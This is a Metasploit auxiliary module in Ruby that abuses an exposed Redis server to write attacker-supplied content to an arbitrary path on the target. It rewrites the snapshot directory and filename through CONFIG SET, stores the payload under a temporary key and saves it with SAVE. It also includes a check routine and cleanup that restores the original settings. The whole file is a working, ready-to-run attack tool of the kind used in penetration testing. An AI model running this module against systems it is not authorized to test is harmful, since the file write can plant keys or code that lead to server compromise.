##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Redis

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Redis File Upload',
        'Description' => %q{
          This module can be used to leverage functionality exposed by Redis to
          achieve somewhat arbitrary file upload to a file and directory to
          which the user account running the redis instance has access.  It is
          not totally arbitrary because the exact contents of the file cannot
          be completely controlled given the nature of how Redis stores its
          database on disk.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Nixawk', # original metasploit module
          'Jon Hart <jon_hart[at]rapid7.com>' # improved metasploit module
        ],
        'References' => [
          ['URL', 'http://antirez.com/news/96'],
          ['URL', 'http://web.archive.org/web/20240907110448/https://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/'],
          ['URL', 'https://redis.io/topics/protocol']
        ],
        'Privileged' => true,
        'DisclosureDate' => '2015-11-11',
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options(
      [
        OptPath.new('LocalFile', [false, 'Local file to be uploaded']),
        OptString.new('RemoteFile', [false, 'Remote file path']),
        OptBool.new('DISABLE_RDBCOMPRESSION', [true, 'Disable compression when saving if found to be enabled', true]),
        OptBool.new('FLUSHALL', [true, 'Run flushall to remove all redis data before saving', false])
      ]
    )
  end

  def send_file(path, content)
    changed_config = {}
    temporary_key = nil
    uploaded = false
    dirname = File.dirname(path)
    basename = File.basename(path)

    original_config = {}
    settings = %w[dir dbfilename]
    settings << 'rdbcompression' if datastore['DISABLE_RDBCOMPRESSION']
    settings.each do |name|
      response = redis_command('CONFIG', 'GET', name)
      fields = response && parse_config_reply(response)
      unless fields&.first == name
        print_error("Failed to read Redis #{name} configuration: #{redis_response_detail(response)}")
        return false
      end
      original_config[name] = fields[1]
    end

    # Track attempted changes too: a lost reply does not prove CONFIG SET failed.
    changed_config['dir'] = original_config['dir']
    return false unless redis_upload_command('set the Redis snapshot directory', 'CONFIG', 'SET', 'dir', dirname)

    changed_config['dbfilename'] = original_config['dbfilename']
    return false unless redis_upload_command('set the Redis snapshot filename', 'CONFIG', 'SET', 'dbfilename', basename)

    if datastore['DISABLE_RDBCOMPRESSION'] && original_config['rdbcompression'].casecmp?('yes')
      changed_config['rdbcompression'] = original_config['rdbcompression']
      return false unless redis_upload_command('disable Redis snapshot compression', 'CONFIG', 'SET', 'rdbcompression', 'no')
    end

    if datastore['FLUSHALL']
      response = redis_command('FLUSHALL')
      unless response == '+OK'
        print_warning("Failed to flush Redis data; continuing: #{redis_response_detail(response)}")
      end
    end

    key = Rex::Text.rand_text_alpha(32)
    # SETNX prevents a collision from overwriting, then deleting, an existing key.
    return false unless redis_upload_command("create temporary Redis key #{key}", 'SETNX', key, content, expected: ':1')

    temporary_key = key
    return false unless redis_upload_command("save #{content.size} bytes to #{path}", 'SAVE')

    uploaded = true
    print_good("Saved #{content.size} bytes inside of redis DB at #{path}")
    true
  ensure
    restore_redis_upload_state(changed_config, temporary_key, uploaded)
  end

  def restore_redis_upload_state(changed_config, temporary_key, uploaded)
    # Attempt every restoration even when an earlier one fails.
    restored = changed_config.map do |name, value|
      redis_upload_command("restore Redis #{name}", 'CONFIG', 'SET', name, value, cleanup: true)
    end.all?
    removed = !temporary_key || redis_upload_command('remove the temporary Redis key', 'DEL', temporary_key, expected: /\A:[01]\z/, cleanup: true)
    return unless uploaded

    if restored && removed
      redis_upload_command('save the cleaned Redis database', 'SAVE', cleanup: true)
    else
      print_warning('Skipped saving the cleaned Redis database because cleanup is incomplete')
    end
  end

  def redis_upload_command(operation, *command, expected: '+OK', cleanup: false)
    response = redis_command(*command)
    matches = expected.is_a?(Regexp) ? expected.match?(response.to_s) : response == expected
    return true if matches

    message = "Failed to #{operation}: #{redis_response_detail(response)}"
    cleanup ? print_warning(message) : print_error(message)
    false
  rescue Rex::ConnectionError, IOError, Errno::ECONNRESET, Errno::EPIPE, ::Timeout::Error, Msf::Auxiliary::Failed => e
    elog("Failed to #{operation}", error: e)
    message = "Failed to #{operation}: #{e.class}: #{e.message}"
    cleanup ? print_warning(message) : print_error(message)
    false
  end

  def redis_response_detail(response)
    response ? printable_redis_response(response, false) : 'No response from Redis'
  end

  def check_host(_ip)
    connect
    config_data = redis_command('CONFIG', 'GET', 'dbfilename')
    return Exploit::CheckCode::Unknown('Redis did not return its snapshot filename configuration') unless config_data
    if config_data.start_with?('-ERR unknown command', '-NOPERM')
      return Exploit::CheckCode::Safe('Redis snapshot filename configuration is not accessible')
    end

    filename_config = parse_config_reply(config_data)
    return Exploit::CheckCode::Unknown('Redis returned an unexpected snapshot filename configuration') unless filename_config&.first == 'dbfilename'

    if (info_data = redis_command('INFO', 'server')) && /redis_version:(?<redis_version>\S+)/ =~ info_data
      report_redis(redis_version)
    end

    protection_data = redis_command('CONFIG', 'GET', 'enable-protected-configs')
    return Exploit::CheckCode::Unknown('Redis did not return its protected configuration policy') unless protection_data

    protection_config = parse_config_reply(protection_data)
    return Exploit::CheckCode::Unknown('Redis returned an unexpected protected configuration policy') unless protection_config

    # Redis 7 protects dir and dbfilename even when CONFIG GET is allowed:
    # https://github.com/redis/redis/blob/7.2/redis.conf#L105-L126
    if protection_config == ['enable-protected-configs', 'no']
      return Exploit::CheckCode::Safe('Redis protected configuration prevents changing dir and dbfilename')
    end

    if protection_config == ['enable-protected-configs', 'local']
      return Exploit::CheckCode::Appears('Redis configuration is readable, but protected file settings require a local connection; file upload has not been verified')
    end

    # Older releases return an empty array for an unknown configuration name.
    unless protection_config.empty? || protection_config == ['enable-protected-configs', 'yes']
      return Exploit::CheckCode::Unknown('Redis returned an unrecognized protected configuration policy')
    end

    Exploit::CheckCode::Appears('Redis snapshot configuration is accessible; file upload has not been verified')
  rescue Rex::ConnectionError, Errno::ECONNRESET, ::Timeout::Error, ::EOFError, Msf::Auxiliary::Failed => e
    elog('Redis file-upload check failed', error: e)
    Exploit::CheckCode::Unknown("Could not query Redis configuration: #{e.message}")
  ensure
    disconnect
  end

  def parse_config_reply(response)
    return unless response.start_with?('*')

    fields = parse_redis_response(response)
    return fields if fields.is_a?(Array) && [0, 2].include?(fields.length) && fields.all? { |field| field.is_a?(String) }
  rescue RuntimeError, NoMethodError => e
    # The mixin parser raises RuntimeError for invalid types and NoMethodError
    # when a truncated array ends before its next element.
    elog('Could not parse Redis configuration response', error: e)
    nil
  end

  def setup
    # this is the content we will upload if not running 'check'.  We are
    # setting a key/value pair in the database to something such that when the
    # redis db is saved, the contents of what we are uploading will appear
    # intact in the middle of the db itself.  The hope is that something
    # interpreting this file will ignore or be OK-enough with the rest of the
    # file such that what we uploaded will be interpreted as if it contained
    # only the contents of what we uploaded.  For example, here is a nearly
    # empty redis database that started with a single key (foo) value (bar)
    # pair, and the contents of what we uploaded was the current date:
    #
    # 00000000  52 45 44 49 53 30 30 30  31 fe 00 00 03 66 6f 6f  |REDIS0001....foo|
    # 00000010  03 62 61 72 00 20 6a 6b  59 47 44 74 56 6a 68 53  |.bar. jkYGDtVjhS|
    # 00000020  6e 57 4f 78 76 58 72 73  6a 71 58 4f 43 52 43 6c  |nWOxvXrsjqXOCRCl|
    # 00000030  66 4b 6a 54 73 47 1e 0a  54 68 75 20 44 65 63 20  |fKjTsG..Thu Dec |
    # 00000040  31 30 20 30 39 3a 30 35  3a 32 39 20 50 53 54 20  |10 09:05:29 PST |
    # 00000050  32 30 31 35 0a ff
    #
    # as you can see, the current date exists on its own on a separate line
    @upload_content = "\n#{File.read(datastore['LocalFile']).strip}\n" if datastore['LocalFile']
  end

  def run_host(ip)
    fail_with(Failure::BadConfig, 'LocalFile must be set') unless datastore['LocalFile']
    fail_with(Failure::BadConfig, 'RemoteFile must be set') unless datastore['RemoteFile']
    result = check_host(ip)
    unless result == Exploit::CheckCode::Appears
      print_error("File upload is unavailable: #{result.reason}")
      return
    end

    begin
      connect
      send_file(datastore['RemoteFile'], @upload_content)
    ensure
      disconnect
    end
  end
end
